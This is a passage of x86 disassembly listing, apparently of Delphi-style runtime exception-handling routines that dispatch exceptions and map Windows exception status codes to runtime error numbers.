  40431d:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  404323:	74 1f                	je     0x404344
  404325:	fc                   	cld
  404326:	e8 45 fa ff ff       	call   0x403d70
  40432b:	8b 15 0c d0 41 00    	mov    0x41d00c,%edx
  404331:	85 d2                	test   %edx,%edx
  404333:	0f 84 53 01 00 00    	je     0x40448c
  404339:	ff d2                	call   *%edx
  40433b:	85 c0                	test   %eax,%eax
  40433d:	75 0a                	jne    0x404349
  40433f:	e9 48 01 00 00       	jmp    0x40448c
  404344:	8b 40 18             	mov    0x18(%eax),%eax
  404347:	8b 00                	mov    (%eax),%eax
  404349:	8b 54 24 08          	mov    0x8(%esp),%edx
  40434d:	53                   	push   %ebx
  40434e:	56                   	push   %esi
  40434f:	57                   	push   %edi
  404350:	55                   	push   %ebp
  404351:	8b 4a 04             	mov    0x4(%edx),%ecx
  404354:	8b 59 05             	mov    0x5(%ecx),%ebx
  404357:	8d 71 09             	lea    0x9(%ecx),%esi
  40435a:	89 c5                	mov    %eax,%ebp
  40435c:	8b 06                	mov    (%esi),%eax
  40435e:	85 c0                	test   %eax,%eax
  404360:	74 43                	je     0x4043a5
  404362:	89 ef                	mov    %ebp,%edi
  404364:	eb 02                	jmp    0x404368
  404366:	8b 3f                	mov    (%edi),%edi
  404368:	8b 00                	mov    (%eax),%eax
  40436a:	39 f8                	cmp    %edi,%eax
  40436c:	74 37                	je     0x4043a5
  40436e:	8b 48 d8             	mov    -0x28(%eax),%ecx
  404371:	3b 4f d8             	cmp    -0x28(%edi),%ecx
  404374:	75 17                	jne    0x40438d
  404376:	8b 40 d4             	mov    -0x2c(%eax),%eax
  404379:	8b 57 d4             	mov    -0x2c(%edi),%edx
  40437c:	31 c9                	xor    %ecx,%ecx
  40437e:	8a 08                	mov    (%eax),%cl
  404380:	3a 0a                	cmp    (%edx),%cl
  404382:	75 09                	jne    0x40438d
  404384:	40                   	inc    %eax
  404385:	42                   	inc    %edx
  404386:	e8 15 f0 ff ff       	call   0x4033a0
  40438b:	74 18                	je     0x4043a5
  40438d:	8b 7f dc             	mov    -0x24(%edi),%edi
  404390:	8b 06                	mov    (%esi),%eax
  404392:	85 ff                	test   %edi,%edi
  404394:	75 d0                	jne    0x404366
  404396:	83 c6 08             	add    $0x8,%esi
  404399:	4b                   	dec    %ebx
  40439a:	75 c0                	jne    0x40435c
  40439c:	5d                   	pop    %ebp
  40439d:	5f                   	pop    %edi
  40439e:	5e                   	pop    %esi
  40439f:	5b                   	pop    %ebx
  4043a0:	e9 e7 00 00 00       	jmp    0x40448c
  4043a5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4043a9:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  4043af:	8b 50 18             	mov    0x18(%eax),%edx
  4043b2:	8b 48 14             	mov    0x14(%eax),%ecx
  4043b5:	74 41                	je     0x4043f8
  4043b7:	ff 15 10 d0 41 00    	call   *0x41d010
  4043bd:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4043c1:	e8 32 fd ff ff       	call   0x4040f8
  4043c6:	80 3d 28 c0 41 00 00 	cmpb   $0x0,0x41c028
  4043cd:	76 1e                	jbe    0x4043ed
  4043cf:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  4043d6:	77 15                	ja     0x4043ed
  4043d8:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4043dc:	50                   	push   %eax
  4043dd:	51                   	push   %ecx
  4043de:	e8 cd cd ff ff       	call   0x4011b0
  4043e3:	83 f8 00             	cmp    $0x0,%eax
  4043e6:	58                   	pop    %eax
  4043e7:	0f 84 9f 00 00 00    	je     0x40448c
  4043ed:	89 c2                	mov    %eax,%edx
  4043ef:	8b 44 24 14          	mov    0x14(%esp),%eax
  4043f3:	8b 48 0c             	mov    0xc(%eax),%ecx
  4043f6:	eb 27                	jmp    0x40441f
  4043f8:	80 3d 28 c0 41 00 01 	cmpb   $0x1,0x41c028
  4043ff:	76 1e                	jbe    0x40441f
  404401:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  404408:	77 15                	ja     0x40441f
  40440a:	50                   	push   %eax
  40440b:	8d 44 24 08          	lea    0x8(%esp),%eax
  40440f:	52                   	push   %edx
  404410:	51                   	push   %ecx
  404411:	50                   	push   %eax
  404412:	e8 99 cd ff ff       	call   0x4011b0
  404417:	83 f8 00             	cmp    $0x0,%eax
  40441a:	59                   	pop    %ecx
  40441b:	5a                   	pop    %edx
  40441c:	58                   	pop    %eax
  40441d:	74 6d                	je     0x40448c
  40441f:	31 db                	xor    %ebx,%ebx
  404421:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  404424:	53                   	push   %ebx
  404425:	50                   	push   %eax
  404426:	52                   	push   %edx
  404427:	51                   	push   %ecx
  404428:	8b 54 24 28          	mov    0x28(%esp),%edx
  40442c:	83 48 04 02          	orl    $0x2,0x4(%eax)
  404430:	56                   	push   %esi
  404431:	6a 00                	push   $0x0
  404433:	50                   	push   %eax
  404434:	68 40 44 40 00       	push   $0x404440
  404439:	52                   	push   %edx
  40443a:	ff 15 18 d0 41 00    	call   *0x41d018
  404440:	5b                   	pop    %ebx
  404441:	8b 7c 24 28          	mov    0x28(%esp),%edi
  404445:	e8 1a 24 00 00       	call   0x406864
  40444a:	ff b0 00 00 00 00    	push   0x0(%eax)
  404450:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  404456:	8b 6f 08             	mov    0x8(%edi),%ebp
  404459:	c7 47 04 6c 44 40 00 	movl   $0x40446c,0x4(%edi)
  404460:	8b 44 24 08          	mov    0x8(%esp),%eax
  404464:	e8 cb fc ff ff       	call   0x404134
  404469:	ff 63 04             	jmp    *0x4(%ebx)
  40446c:	e9 23 00 00 00       	jmp    0x404494
  404471:	e8 ee 23 00 00       	call   0x406864
  404476:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  40447c:	8b 11                	mov    (%ecx),%edx
  40447e:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  404484:	8b 41 08             	mov    0x8(%ecx),%eax
  404487:	e9 84 f9 ff ff       	jmp    0x403e10
  40448c:	b8 01 00 00 00       	mov    $0x1,%eax
  404491:	c3                   	ret
  404492:	8b c0                	mov    %eax,%eax
  404494:	8b 44 24 04          	mov    0x4(%esp),%eax
  404498:	8b 54 24 08          	mov    0x8(%esp),%edx
  40449c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4044a3:	74 1f                	je     0x4044c4
  4044a5:	8b 4a 04             	mov    0x4(%edx),%ecx
  4044a8:	c7 42 04 c4 44 40 00 	movl   $0x4044c4,0x4(%edx)
  4044af:	53                   	push   %ebx
  4044b0:	56                   	push   %esi
  4044b1:	57                   	push   %edi
  4044b2:	55                   	push   %ebp
  4044b3:	8b 6a 08             	mov    0x8(%edx),%ebp
  4044b6:	83 c1 05             	add    $0x5,%ecx
  4044b9:	e8 be fc ff ff       	call   0x40417c
  4044be:	ff d1                	call   *%ecx
  4044c0:	5d                   	pop    %ebp
  4044c1:	5f                   	pop    %edi
  4044c2:	5e                   	pop    %esi
  4044c3:	5b                   	pop    %ebx
  4044c4:	b8 01 00 00 00       	mov    $0x1,%eax
  4044c9:	c3                   	ret
  4044ca:	8b c0                	mov    %eax,%eax
  4044cc:	09 c0                	or     %eax,%eax
  4044ce:	75 0a                	jne    0x4044da
  4044d0:	b8 d8 00 00 00       	mov    $0xd8,%eax
  4044d5:	e8 ae 05 00 00       	call   0x404a88
  4044da:	5a                   	pop    %edx
  4044db:	54                   	push   %esp
  4044dc:	55                   	push   %ebp
  4044dd:	57                   	push   %edi
  4044de:	56                   	push   %esi
  4044df:	53                   	push   %ebx
  4044e0:	50                   	push   %eax
  4044e1:	52                   	push   %edx
  4044e2:	54                   	push   %esp
  4044e3:	6a 07                	push   $0x7
  4044e5:	6a 01                	push   $0x1
  4044e7:	68 de fa ed 0e       	push   $0xeedfade
  4044ec:	52                   	push   %edx
  4044ed:	ff 25 14 d0 41 00    	jmp    *0x41d014
  4044f3:	c3                   	ret
  4044f4:	8b 44 24 30          	mov    0x30(%esp),%eax
  4044f8:	c7 40 04 3f 45 40 00 	movl   $0x40453f,0x4(%eax)
  4044ff:	e8 60 23 00 00       	call   0x406864
  404504:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  40450a:	8b 0a                	mov    (%edx),%ecx
  40450c:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  404512:	8b 42 0c             	mov    0xc(%edx),%eax
  404515:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  404519:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  40451f:	74 0d                	je     0x40452e
  404521:	8b 42 08             	mov    0x8(%edx),%eax
  404524:	e8 e7 f8 ff ff       	call   0x403e10
  404529:	e8 ae fb ff ff       	call   0x4040dc
  40452e:	31 c0                	xor    %eax,%eax
  404530:	83 c4 14             	add    $0x14,%esp
  404533:	64 8b 10             	mov    %fs:(%eax),%edx
  404536:	59                   	pop    %ecx
  404537:	8b 12                	mov    (%edx),%edx
  404539:	89 11                	mov    %edx,(%ecx)
  40453b:	5d                   	pop    %ebp
  40453c:	5f                   	pop    %edi
  40453d:	5e                   	pop    %esi
  40453e:	5b                   	pop    %ebx
  40453f:	b8 01 00 00 00       	mov    $0x1,%eax
  404544:	c3                   	ret
  404545:	8d 40 00             	lea    0x0(%eax),%eax
  404548:	e8 17 23 00 00       	call   0x406864
  40454d:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  404553:	8b 0a                	mov    (%edx),%ecx
  404555:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  40455b:	8b 42 08             	mov    0x8(%edx),%eax
  40455e:	e8 ad f8 ff ff       	call   0x403e10
  404563:	5a                   	pop    %edx
  404564:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  404568:	31 c0                	xor    %eax,%eax
  40456a:	59                   	pop    %ecx
  40456b:	64 89 08             	mov    %ecx,%fs:(%eax)
  40456e:	58                   	pop    %eax
  40456f:	5d                   	pop    %ebp
  404570:	e8 2f fc ff ff       	call   0x4041a4
  404575:	ff e2                	jmp    *%edx
  404577:	c3                   	ret
  404578:	31 d2                	xor    %edx,%edx
  40457a:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40457e:	8b 44 24 04          	mov    0x4(%esp),%eax
  404582:	83 c1 05             	add    $0x5,%ecx
  404585:	64 89 02             	mov    %eax,%fs:(%edx)
  404588:	ff d1                	call   *%ecx
  40458a:	c2 0c 00             	ret    $0xc
  40458d:	c3                   	ret
  40458e:	8b c0                	mov    %eax,%eax
  404590:	55                   	push   %ebp
  404591:	8b ec                	mov    %esp,%ebp
  404593:	8b 55 08             	mov    0x8(%ebp),%edx
  404596:	8b 02                	mov    (%edx),%eax
  404598:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  40459d:	7f 2c                	jg     0x4045cb
  40459f:	74 5c                	je     0x4045fd
  4045a1:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  4045a6:	7f 15                	jg     0x4045bd
  4045a8:	74 57                	je     0x404601
  4045aa:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  4045af:	74 5c                	je     0x40460d
  4045b1:	2d 87 00 00 00       	sub    $0x87,%eax
  4045b6:	74 3d                	je     0x4045f5
  4045b8:	48                   	dec    %eax
  4045b9:	74 4e                	je     0x404609
  4045bb:	eb 60                	jmp    0x40461d
  4045bd:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  4045c2:	83 e8 02             	sub    $0x2,%eax
  4045c5:	72 36                	jb     0x4045fd
  4045c7:	74 30                	je     0x4045f9
  4045c9:	eb 52                	jmp    0x40461d
  4045cb:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4045d0:	7f 11                	jg     0x4045e3
  4045d2:	74 3d                	je     0x404611
  4045d4:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  4045d9:	74 2e                	je     0x404609
  4045db:	48                   	dec    %eax
  4045dc:	74 13                	je     0x4045f1
  4045de:	48                   	dec    %eax
  4045df:	74 24                	je     0x404605
  4045e1:	eb 3a                	jmp    0x40461d
  4045e3:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  4045e8:	74 2f                	je     0x404619
  4045ea:	83 e8 3d             	sub    $0x3d,%eax
  4045ed:	74 26                	je     0x404615
  4045ef:	eb 2c                	jmp    0x40461d
  4045f1:	b0 c8                	mov    $0xc8,%al
  4045f3:	eb 2a                	jmp    0x40461f
  4045f5:	b0 c9                	mov    $0xc9,%al
  4045f7:	eb 26                	jmp    0x40461f
  4045f9:	b0 cd                	mov    $0xcd,%al
  4045fb:	eb 22                	jmp    0x40461f
  4045fd:	b0 cf                	mov    $0xcf,%al
  4045ff:	eb 1e                	jmp    0x40461f
  404601:	b0 c8                	mov    $0xc8,%al
  404603:	eb 1a                	jmp    0x40461f
  404605:	b0 d7                	mov    $0xd7,%al
  404607:	eb 16                	jmp    0x40461f
  404609:	b0 ce                	mov    $0xce,%al
  40460b:	eb 12                	jmp    0x40461f
  40460d:	b0 d8                	mov    $0xd8,%al
  40460f:	eb 0e                	jmp    0x40461f
  404611:	b0 da                	mov    $0xda,%al
  404613:	eb 0a                	jmp    0x40461f
  404615:	b0 d9                	mov    $0xd9,%al
  404617:	eb 06                	jmp    0x40461f
  404619:	b0 ca                	mov    $0xca,%al
  40461b:	eb 02                	jmp    0x40461f
  40461d:	b0 ff                	mov    $0xff,%al
  40461f:	25 ff 00 00 00       	and    $0xff,%eax
  404624:	8b 52 0c             	mov    0xc(%edx),%edx
  404627:	e8 58 e4 ff ff       	call   0x402a84
  40462c:	5d                   	pop    %ebp
  40462d:	c2 04 00             	ret    $0x4
  404630:	8b 44 24 04          	mov    0x4(%esp),%eax
  404634:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40463b:	0f 85 89 00 00 00    	jne    0x4046ca
  404641:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  404648:	77 0f                	ja     0x404659
  40464a:	8d 44 24 04          	lea    0x4(%esp),%eax
  40464e:	50                   	push   %eax
  40464f:	e8 5c cb ff ff       	call   0x4011b0
  404654:	83 f8 00             	cmp    $0x0,%eax
  404657:	74 71                	je     0x4046ca
  404659:	8b 44 24 04          	mov    0x4(%esp),%eax
  40465d:	fc                   	cld
  40465e:	e8 0d f7 ff ff       	call   0x403d70
  404663:	8b 54 24 08          	mov    0x8(%esp),%edx
  404667:	6a 00                	push   $0x0
  404669:	50                   	push   %eax
  40466a:	68 76 46 40 00       	push   $0x404676
